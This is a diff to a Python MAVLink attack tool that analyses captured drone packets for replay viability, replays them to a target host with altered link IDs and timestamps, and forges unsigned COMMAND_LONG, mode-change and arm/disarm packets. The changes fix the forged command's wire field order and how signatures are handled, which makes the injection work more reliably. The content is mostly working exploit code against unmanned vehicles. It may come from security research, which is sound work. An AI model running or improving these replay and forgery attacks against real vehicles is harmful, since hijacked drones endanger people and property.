@@ -203,13 +203,13 @@ class MavlinkPacket:
         if not self.signed:
             return self.raw
 
-        header_for_sig = bytearray(self.raw[0:10])
-        header_for_sig[2] = header_for_sig[2] & ~MAVLINK_IFLAG_SIGNED
         crc_offset = 10 + self.payload_len
         crc_bytes = self.raw[crc_offset:crc_offset + 2]
         ts_bytes = self.timestamp.to_bytes(6, "little")
 
         if secret_key is not None:
+            header_for_sig = bytearray(self.raw[0:10])
+            header_for_sig[2] = header_for_sig[2] & ~MAVLINK_IFLAG_SIGNED
             h = hashlib.sha256()
             h.update(secret_key)
             h.update(header_for_sig)
@@ -218,26 +218,29 @@ class MavlinkPacket:
             h.update(bytes([new_link_id]))
             h.update(ts_bytes)
             new_sig = h.digest()[:6]
+            result = bytearray(self.raw[:crc_offset + 2])
+            result.append(new_link_id)
+            result.extend(ts_bytes)
+            result.extend(new_sig)
+            return bytes(result)
         else:
-            new_sig = self.signature
-
-        result = bytearray(self.raw[:crc_offset + 2])
-        result.append(new_link_id)
-        result.extend(ts_bytes)
-        result.extend(new_sig)
-        return bytes(result)
+            # No key: strip signature — old sig is invalid after field change.
+            # Return an unsigned packet so caller knows it won't authenticate.
+            result = bytearray(self.raw[:crc_offset + 2])
+            result[2] = result[2] & ~MAVLINK_IFLAG_SIGNED
+            return bytes(result)
 
     def rebuild_with_timestamp(self, new_timestamp, secret_key=None):
         if not self.signed:
             return self.raw
 
-        header_for_sig = bytearray(self.raw[0:10])
-        header_for_sig[2] = header_for_sig[2] & ~MAVLINK_IFLAG_SIGNED
         crc_offset = 10 + self.payload_len
         crc_bytes = self.raw[crc_offset:crc_offset + 2]
         ts_bytes = new_timestamp.to_bytes(6, "little")
 
         if secret_key is not None:
+            header_for_sig = bytearray(self.raw[0:10])
+            header_for_sig[2] = header_for_sig[2] & ~MAVLINK_IFLAG_SIGNED
             h = hashlib.sha256()
             h.update(secret_key)
             h.update(header_for_sig)
@@ -246,14 +249,16 @@ class MavlinkPacket:
             h.update(bytes([self.link_id]))
             h.update(ts_bytes)
             new_sig = h.digest()[:6]
+            result = bytearray(self.raw[:crc_offset + 2])
+            result.append(self.link_id)
+            result.extend(ts_bytes)
+            result.extend(new_sig)
+            return bytes(result)
         else:
-            new_sig = self.signature
-
-        result = bytearray(self.raw[:crc_offset + 2])
-        result.append(self.link_id)
-        result.extend(ts_bytes)
-        result.extend(new_sig)
-        return bytes(result)
+            # No key: strip signature — old sig is invalid after field change.
+            result = bytearray(self.raw[:crc_offset + 2])
+            result[2] = result[2] & ~MAVLINK_IFLAG_SIGNED
+            return bytes(result)
 
 
 class PacketReader:
@@ -450,13 +455,16 @@ def cmd_analyze(args):
 
         replay_window_ticks = REPLAY_WINDOW_SECONDS * 100000
         if age < REPLAY_WINDOW_SECONDS:
-            print(f"\n  ** REPLAY VIABLE: newest packet is within {REPLAY_WINDOW_SECONDS}s window **")
             viable = [p for p in packets
                       if p.get("timestamp") and (current_ts - p["timestamp"]) < replay_window_ticks]
-            print(f"  ** {len(viable)} of {len(packets)} packets within window **")
+            print(f"\n  {len(viable)} of {len(packets)} packets are <{REPLAY_WINDOW_SECONDS}s old")
+            print(f"  NOTE: timestamp age alone does not establish replay viability.")
+            print(f"  The receiver's per-stream anti-replay state, valid authentication,")
+            print(f"  and accept_unsigned policy all affect whether packets are accepted.")
         else:
-            print(f"\n  Newest packet is {age:.0f}s old — outside same-link replay window")
-            print(f"  Cross-link replay (different link_id) or post-reboot replay may still work")
+            print(f"\n  Newest packet is {age:.0f}s old (>{REPLAY_WINDOW_SECONDS}s)")
+            print(f"  Acceptance depends on receiver state: cold-start (no baseline)")
+            print(f"  or accept_unsigned policy may still permit replay.")
 
     # Replayable command packets
     attack_msgs = {"COMMAND_LONG", "SET_MODE", "COMPONENT_ARM_DISARM",
@@ -525,6 +533,8 @@ def cmd_replay(args):
     log(f"Replaying {len(packets)} packets to {target_host}:{target_port}")
     if args.cross_link is not None:
         log(f"Cross-link replay: link_id -> {args.cross_link}")
+        log("WARNING: no signing key — mutated packets are sent UNSIGNED "
+            "(signature stripped). A receiver requiring valid signatures will reject them.")
 
     for p in packets:
         raw = bytes.fromhex(p["raw_hex"])
@@ -588,12 +598,14 @@ def cmd_forge_unsigned(args):
         payload = struct.pack("<IBBBBB", 0, 6, 8, 0, 0, 3)
         msg_id = 0
     else:
-        # COMMAND_LONG: target_system, target_component, command, confirmation, param1-7
+        # COMMAND_LONG wire order (MAVLink field reordering by size):
+        # 7 floats first, then uint16 command, then 3 uint8s
         command_id, p1, p2, p3, p4, p5, p6, p7 = COMMANDS[cmd]
-        payload = struct.pack("<BBHBfffffff",
+        payload = struct.pack("<fffffffHBBB",
+                              p1, p2, p3, p4, p5, p6, p7,
+                              command_id,
                               target_sys, 1,  # target_system, target_component
-                              command_id, 0,  # command, confirmation
-                              p1, p2, p3, p4, p5, p6, p7)
+                              0)  # confirmation
         msg_id = 76  # COMMAND_LONG
 
     # Build MAVLink v2 header (unsigned)
